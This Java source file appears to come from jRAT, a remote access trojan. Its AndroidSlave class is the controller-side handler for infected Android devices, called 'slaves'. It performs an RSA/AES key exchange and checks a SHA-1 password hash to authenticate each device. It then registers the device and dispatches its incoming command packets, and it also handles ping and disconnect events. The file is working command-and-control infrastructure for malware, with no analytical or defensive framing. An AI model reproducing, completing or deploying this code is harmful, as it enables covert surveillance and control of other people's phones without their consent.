package io.jrat.controller.android;

import io.jrat.common.Logger;
import io.jrat.common.codec.Hex;
import io.jrat.common.crypto.Crypto;
import io.jrat.common.crypto.StreamKeyExchanger;
import io.jrat.common.hash.Sha1;
import io.jrat.controller.AbstractSlave;
import io.jrat.controller.LogAction;
import io.jrat.controller.Main;
import io.jrat.controller.addons.PluginEventHandler;
import io.jrat.controller.crypto.GlobalKeyPair;
import io.jrat.controller.exceptions.CloseException;
import io.jrat.controller.net.ConnectionHandler;
import io.jrat.controller.net.ServerListener;
import io.jrat.controller.packets.android.incoming.IncomingAndroidPackets;
import io.jrat.controller.packets.android.outgoing.AbstractOutgoingAndroidPacket;
import io.jrat.controller.packets.android.outgoing.AndroidPacket0Ping;
import io.jrat.controller.utils.TrayIconUtils;
import java.awt.TrayIcon;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.Arrays;
import javax.crypto.BadPaddingException;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

public class AndroidSlave extends AbstractSlave {
	
	public AndroidSlave(ServerListener connection, Socket socket) {
		super(connection, socket);
		new Thread(this).start();
	}

	@Override
	public void run() {
		try {
			initialize();
		
			StreamKeyExchanger exchanger = new StreamKeyExchanger(GlobalKeyPair.getKeyPair(), dis, dos);
			exchanger.writePublicKey();
			rsaKey = exchanger.readRemoteKey();
			
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(128);
            SecretKey secretKey = keyGen.generateKey();

            key = secretKey.getEncoded();
            byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
            dos.writeInt(encryptedKey.length);
            dos.write(encryptedKey);
			
			if (Main.debug) {
				Logger.log("Encryption key: " + Hex.encode(key));
			}

			while (true) {
				byte header = readByte();

				if (header == 1) {
					Sha1 sha = new Sha1();
					
					String data = connection.getPass();

					byte[] localHash = sha.hash(data);
					byte[] remoteHash = new byte[20];

					dis.readFully(remoteHash);					

					if (Arrays.equals(localHash, remoteHash)) {
						setAuthenticated(true);
						ConnectionHandler.addSlave(this);
						continue;
					}
				}

				if (!isAuthenticated()) {
					Main.instance.getPanelLog().addEntry(LogAction.WARNING, this, "Failed verifying password, not valid handshake");
					this.closeSocket(new CloseException("Failed verifying password, not valid handshake"));
				}

				if (header == 0) {
					pong();
					continue;
				}

				IncomingAndroidPackets.execute(header, this);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();

			Main.instance.getPanelLog().addEntry(LogAction.DISCONNECT, this, message);

			if (ex instanceof BadPaddingException) {
				message += ", is the encryption key matching?";
			}

			try {
				ConnectionHandler.removeSlave(this, 0);
			} catch (Exception e) {
			}

			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
			PluginEventHandler.onDisconnect(this);
		}
	}

	@Override
	public void ping() throws Exception {
		addToSendQueue(new AndroidPacket0Ping());
	}

	@Override
	public String getDisplayName() {
		// TODO Auto-generated method stub
		return null;
	}
	
	public synchronized void addToSendQueue(AbstractOutgoingAndroidPacket packet) {
		try {
			sendPacket(packet, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void sendPacket(AbstractOutgoingAndroidPacket packet, DataOutputStream dos) throws Exception {
		packet.send(this, dos);
	}

	@Override
	public String getFileSeparator() {
		return "/";
	}

}
